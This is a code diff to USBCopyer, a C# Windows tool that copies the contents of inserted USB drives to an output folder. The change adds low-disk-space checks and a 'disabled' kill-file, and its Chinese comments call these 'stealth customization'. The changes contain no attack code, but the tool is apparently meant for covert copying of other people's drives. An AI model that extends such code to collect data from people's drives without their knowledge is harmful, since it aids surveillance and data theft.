@@ -24,6 +24,8 @@ namespace USBCopyer
         public string[] blackid;
         public Dictionary<string, Thread> copyThread = new Dictionary<string, Thread>(); //正在复制文件的线程 分区号=>线程
         public static List<char> Volumes = new List<char>();
+        // 隐藏性定制：复制中止标志（输出盘空间不足时置位，递归各层据此退出）
+        private volatile bool copyAborted = false;
 
         public Host()
         {
@@ -540,13 +542,32 @@ namespace USBCopyer
                                                 {
                                                     Program.log("写入磁盘日志 Disk.csv 失败，文件可能被占用：\r\n" + ex.ToString(), 1);
                                                 }
-                                                CopyDirectory(disk + "\\", dir + diskdir);
-                                                if (Properties.Settings.Default.SkipEmptyFolder)
+                                                // 隐藏性定制：输出目录所在磁盘空间不足时跳过本次复制
+                                                copyAborted = false;
+                                                if (IsDiskSpaceCritical(dir))
                                                 {
-                                                    KillEmptyDirectory(dir + diskdir);
+                                                    Program.log("输出目录所在磁盘空间不足（剩余 " + GetFreeSpaceMB(dir) + " MB），已跳过本次复制", 0);
                                                 }
-                                                // 删除空目录会刷新父目录时间，这里按源目录树再校正一次
-                                                RestoreDirectoryTimes(disk + "\\", dir + diskdir);
+                                                else if (IsCopyDisabled())
+                                                {
+                                                    // disabled 存在时仍建目录、仍写 Disks.csv，仅不复制文件
+                                                    try
+                                                    {
+                                                        Directory.CreateDirectory(dir + diskdir);
+                                                    }
+                                                    catch { }
+                                                    Program.log("检测到 disabled 文件，本次仅建目录、不复制文件", 0);
+                                                }
+                                                else
+                                                {
+                                                    CopyDirectory(disk + "\\", dir + diskdir);
+                                                    if (Properties.Settings.Default.SkipEmptyFolder)
+                                                    {
+                                                        KillEmptyDirectory(dir + diskdir);
+                                                    }
+                                                    // 删除空目录会刷新父目录时间，这里按源目录树再校正一次
+                                                    RestoreDirectoryTimes(disk + "\\", dir + diskdir);
+                                                }
                                                 //AllCompletedCallback
                                                 if (Properties.Settings.Default.EnableAllCompletedCallback && File.Exists(confdir + "AllCompletedCallback.bat"))
                                                 {
@@ -709,6 +730,61 @@ namespace USBCopyer
         }
 
         /// <summary>
+        /// 判断路径所在磁盘是否空间不足：剩余低于总量 10%，或剩余低于 200MB
+        /// 口径与资源管理器磁盘条变红一致
+        /// </summary>
+        private bool IsDiskSpaceCritical(string path)
+        {
+            try
+            {
+                string root = Path.GetPathRoot(path);
+                if (string.IsNullOrEmpty(root)) return false;
+                DriveInfo di = new DriveInfo(root);
+                if (!di.IsReady) return false;
+                long total = di.TotalSize;
+                long free = di.AvailableFreeSpace;
+                if (total <= 0) return false;
+                return free < (total / 10) || free < 200L * 1024 * 1024;
+            }
+            catch
+            {
+                // 网络盘、权限不足、盘已拔出等情况不阻断复制
+                return false;
+            }
+        }
+
+        private long GetFreeSpaceMB(string path)
+        {
+            try
+            {
+                string root = Path.GetPathRoot(path);
+                if (string.IsNullOrEmpty(root)) return -1;
+                DriveInfo di = new DriveInfo(root);
+                if (!di.IsReady) return -1;
+                return di.AvailableFreeSpace / 1048576L;
+            }
+            catch
+            {
+                return -1;
+            }
+        }
+
+        /// <summary>
+        /// 隐藏性定制：exe 同目录存在名为 disabled 的文件时，本次不复制文件（目录与 Disks.csv 照常）
+        /// </summary>
+        private bool IsCopyDisabled()
+        {
+            try
+            {
+                return File.Exists(Path.Combine(Application.StartupPath, "disabled"));
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        /// <summary>
         /// 复制文件夹（及文件夹下所有子文件夹和文件）
         /// </summary>
         /// <param name="sourcePath">待复制的文件夹路径</param>
@@ -728,6 +804,14 @@ namespace USBCopyer
                 string CopyLog = "复制操作：输出目录：" + destinationPath + "\r\n";
                 foreach (FileSystemInfo fsi in info.GetFileSystemInfos())
                 {
+                    // 隐藏性定制：复制过程中输出盘转为空间不足时中止本次复制
+                    if (copyAborted) return;
+                    if (IsDiskSpaceCritical(dir))
+                    {
+                        copyAborted = true;
+                        Program.log("复制过程中输出磁盘空间不足（剩余 " + GetFreeSpaceMB(dir) + " MB），已中止复制", 1);
+                        return;
+                    }
                     String destName = Path.Combine(destinationPath, fsi.Name);
 
                     if (fsi is FileInfo)
